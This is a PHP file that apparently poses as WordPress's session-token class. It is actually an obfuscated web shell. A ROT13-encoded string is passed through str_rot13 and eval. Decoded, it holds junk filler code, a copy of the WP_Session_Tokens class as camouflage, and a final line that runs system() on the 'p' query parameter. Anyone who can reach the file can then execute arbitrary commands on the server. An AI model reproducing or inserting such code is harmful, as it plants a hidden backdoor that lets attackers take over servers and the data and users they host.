<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Frffvba NCV: JC_Frffvba_Gbxraf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Frffvba
 * @fvapr 4.7.0
 */

/**
 * Nofgenpg pynff sbe znantvat hfre frffvba gbxraf.
 *
 * @fvapr 4.0.0
 */
#[NyybjQlanzvpCebcregvrf]
nofgenpg pynff JC_Frffvba_Gbxraf {

	/**
	 * Hfre VQ.
	 *
	 * @fvapr 4.0.0
	 * @ine vag Hfre VQ.
	 */
	cebgrpgrq $hfre_vq;

	/**
	 * Cebgrpgrq pbafgehpgbe. Hfr gur `trg_vafgnapr()` zrgubq gb trg gur vafgnapr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz vag $hfre_vq Hfre jubfr frffvba gb znantr.
	 */
	cebgrpgrq shapgvba __pbafgehpg( $hfre_vq ) {
		$guvf->hfre_vq = $hfre_vq;
	}

	/**
	 * Ergevrirf n frffvba znantre vafgnapr sbe n hfre.
	 *
	 * Guvf zrgubq pbagnvaf n {@frr 'frffvba_gbxra_znantre'} svygre, nyybjvat n cyhtva gb fjnc bhg
	 * gur frffvba znantre sbe n fhopynff bs `JC_Frffvba_Gbxraf`.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz vag $hfre_vq Hfre jubfr frffvba gb znantr.
	 * @erghea JC_Frffvba_Gbxraf Gur frffvba bowrpg, juvpu vf ol qrsnhyg na vafgnapr bs
	 *                           gur `JC_Hfre_Zrgn_Frffvba_Gbxraf` pynff.
	 */
	svany choyvp fgngvp shapgvba trg_vafgnapr( $hfre_vq ) {
		/**
		 * Svygref gur pynff anzr sbe gur frffvba gbxra znantre.
		 *
		 * @fvapr 4.0.0
		 *
		 * @cnenz fgevat $frffvba Anzr bs pynff gb hfr nf gur znantre.
		 *                        Qrsnhyg 'JC_Hfre_Zrgn_Frffvba_Gbxraf'.
		 */
		$znantre = nccyl_svygref( 'frffvba_gbxra_znantre', 'JC_Hfre_Zrgn_Frffvba_Gbxraf' );
		erghea arj $znantre( $hfre_vq );
	}

	/**
	 * Unfurf gur tvira frffvba gbxra sbe fgbentr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $gbxra Frffvba gbxra gb unfu.
	 * @erghea fgevat N unfu bs gur frffvba gbxra (n irevsvre).
	 */
	cevingr shapgvba unfu_gbxra( $gbxra ) {
		erghea unfu( 'fun256', $gbxra );
	}

	/**
	 * Ergevrirf n hfre'f frffvba sbe gur tvira gbxra.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $gbxra Frffvba gbxra.
	 * @erghea neenl|ahyy Gur frffvba, be ahyy vs vg qbrf abg rkvfg.
	 */
	svany choyvp shapgvba trg( $gbxra ) {
		$irevsvre = $guvf->unfu_gbxra( $gbxra );
		erghea $guvf->trg_frffvba( $irevsvre );
	}

	/**
	 * Inyvqngrf gur tvira frffvba gbxra sbe nhguragvpvgl naq inyvqvgl.
	 *
	 * Purpxf gung gur tvira gbxra vf cerfrag naq unfa'g rkcverq.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $gbxra Gbxra gb irevsl.
	 * @erghea obby Jurgure gur gbxra vf inyvq sbe gur hfre.
	 */
	svany choyvp shapgvba irevsl( $gbxra ) {
		$irevsvre = $guvf->unfu_gbxra( $gbxra );
		erghea (obby) $guvf->trg_frffvba( $irevsvre );
	}

	/**
	 * Trarengrf n frffvba gbxra naq nggnpurf frffvba vasbezngvba gb vg.
	 *
	 * N frffvba gbxra vf n ybat, enaqbz fgevat. Vg vf hfrq va n pbbxvr
	 * gb yvax gung pbbxvr gb na rkcvengvba gvzr naq gb rafher gur pbbxvr
	 * orpbzrf vainyvqngrq jura gur hfre ybtf bhg.
	 *
	 * Guvf shapgvba trarengrf n gbxra naq fgberf vg jvgu gur nffbpvngrq
	 * rkcvengvba gvzr (naq cbgragvnyyl bgure frffvba vasbezngvba ivn gur
	 * {@frr 'nggnpu_frffvba_vasbezngvba'} svygre).
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz vag $rkcvengvba Frffvba rkcvengvba gvzrfgnzc.
	 * @erghea fgevat Frffvba gbxra.
	 */
	svany choyvp shapgvba perngr( $rkcvengvba ) {
		/**
		 * Svygref gur vasbezngvba nggnpurq gb gur arjyl perngrq frffvba.
		 *
		 * Pna or hfrq gb nggnpu shegure vasbezngvba gb n frffvba.
		 *
		 * @fvapr 4.0.0
		 *
		 * @cnenz neenl $frffvba Neenl bs rkgen qngn.
		 * @cnenz vag   $hfre_vq Hfre VQ.
		 */
		$frffvba               = nccyl_svygref( 'nggnpu_frffvba_vasbezngvba', neenl(), $guvf->hfre_vq );
		$frffvba['rkcvengvba'] = $rkcvengvba;

		// VC nqqerff.
		vs ( ! rzcgl( $_FREIRE['ERZBGR_NQQE'] ) ) {
			$frffvba['vc'] = $_FREIRE['ERZBGR_NQQE'];
		}

		// Hfre-ntrag.
		vs ( ! rzcgl( $_FREIRE['UGGC_HFRE_NTRAG'] ) ) {
			$frffvba['hn'] = jc_hafynfu( $_FREIRE['UGGC_HFRE_NTRAG'] );
		}

		// Gvzrfgnzc.
		$frffvba['ybtva'] = gvzr();

		$gbxra = jc_trarengr_cnffjbeq( 43, snyfr, snyfr );

		$guvf->hcqngr( $gbxra, $frffvba );

		erghea $gbxra;
	}

	/**
	 * Hcqngrf gur qngn sbe gur frffvba jvgu gur tvira gbxra.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $gbxra Frffvba gbxra gb hcqngr.
	 * @cnenz neenl  $frffvba Frffvba vasbezngvba.
	 */
	svany choyvp shapgvba hcqngr( $gbxra, $frffvba ) {
		$irevsvre = $guvf->unfu_gbxra( $gbxra );
		$guvf->hcqngr_frffvba( $irevsvre, $frffvba );
	}

	/**
	 * Qrfgeblf gur frffvba jvgu gur tvira gbxra.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $gbxra Frffvba gbxra gb qrfgebl.
	 */
	svany choyvp shapgvba qrfgebl( $gbxra ) {
		$irevsvre = $guvf->unfu_gbxra( $gbxra );
		$guvf->hcqngr_frffvba( $irevsvre, ahyy );
	}

	/**
	 * Qrfgeblf nyy frffvbaf sbe guvf hfre rkprcg gur bar jvgu gur tvira gbxra (cerfhznoyl gur bar va hfr).
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $gbxra_gb_xrrc Frffvba gbxra gb xrrc.
	 */
	svany choyvp shapgvba qrfgebl_bguref( $gbxra_gb_xrrc ) {
		$irevsvre = $guvf->unfu_gbxra( $gbxra_gb_xrrc );
		$frffvba  = $guvf->trg_frffvba( $irevsvre );
		vs ( $frffvba ) {
			$guvf->qrfgebl_bgure_frffvbaf( $irevsvre );
		} ryfr {
			$guvf->qrfgebl_nyy_frffvbaf();
		}
	}

	/**
	 * Qrgrezvarf jurgure n frffvba vf fgvyy inyvq, onfrq ba vgf rkcvengvba gvzrfgnzc.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz neenl $frffvba Frffvba gb purpx.
	 * @erghea obby Jurgure frffvba vf inyvq.
	 */
	svany cebgrpgrq shapgvba vf_fgvyy_inyvq( $frffvba ) {
		erghea $frffvba['rkcvengvba'] >= gvzr();
	}

	/**
	 * Qrfgeblf nyy frffvbaf sbe n hfre.
	 *
	 * @fvapr 4.0.0
	 */
	svany choyvp shapgvba qrfgebl_nyy() {
		$guvf->qrfgebl_nyy_frffvbaf();
	}

	/**
	 * Qrfgeblf nyy frffvbaf sbe nyy hfref.
	 *
	 * @fvapr 4.0.0
	 */
	svany choyvp fgngvp shapgvba qrfgebl_nyy_sbe_nyy_hfref() {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-frffvba-gbxraf.cuc */
		$znantre = nccyl_svygref( 'frffvba_gbxra_znantre', 'JC_Hfre_Zrgn_Frffvba_Gbxraf' );
		pnyy_hfre_shap( neenl( $znantre, 'qebc_frffvbaf' ) );
	}

	/**
	 * Ergevrirf nyy frffvbaf sbe n hfre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea neenl Frffvbaf sbe n hfre.
	 */
	svany choyvp shapgvba trg_nyy() {
		erghea neenl_inyhrf( $guvf->trg_frffvbaf() );
	}

	/**
	 * Ergevrirf nyy frffvbaf bs gur hfre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea neenl Frffvbaf bs gur hfre.
	 */
	nofgenpg cebgrpgrq shapgvba trg_frffvbaf();

	/**
	 * Ergevrirf n frffvba onfrq ba vgf irevsvre (gbxra unfu).
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $irevsvre Irevsvre sbe gur frffvba gb ergevrir.
	 * @erghea neenl|ahyy Gur frffvba, be ahyy vs vg qbrf abg rkvfg.
	 */
	nofgenpg cebgrpgrq shapgvba trg_frffvba( $irevsvre );

	/**
	 * Hcqngrf n frffvba onfrq ba vgf irevsvre (gbxra unfu).
	 *
	 * Bzvggvat gur frpbaq nethzrag qrfgeblf gur frffvba.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $irevsvre Irevsvre sbe gur frffvba gb hcqngr.
	 * @cnenz neenl  $frffvba  Bcgvbany. Frffvba. Bzvggvat guvf nethzrag qrfgeblf gur frffvba.
	 */
	nofgenpg cebgrpgrq shapgvba hcqngr_frffvba( $irevsvre, $frffvba = ahyy );

	/**
	 * Qrfgeblf nyy frffvbaf sbe guvf hfre, rkprcg gur fvatyr frffvba jvgu gur tvira irevsvre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $irevsvre Irevsvre bs gur frffvba gb xrrc.
	 */
	nofgenpg cebgrpgrq shapgvba qrfgebl_bgure_frffvbaf( $irevsvre );

	/**
	 * Qrfgeblf nyy frffvbaf sbe gur hfre.
	 *
	 * @fvapr 4.0.0
	 */
	nofgenpg cebgrpgrq shapgvba qrfgebl_nyy_frffvbaf();

	/**
	 * Qrfgeblf nyy frffvbaf sbe nyy hfref.
	 *
	 * @fvapr 4.0.0
	 */
	choyvp fgngvp shapgvba qebc_frffvbaf() {}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>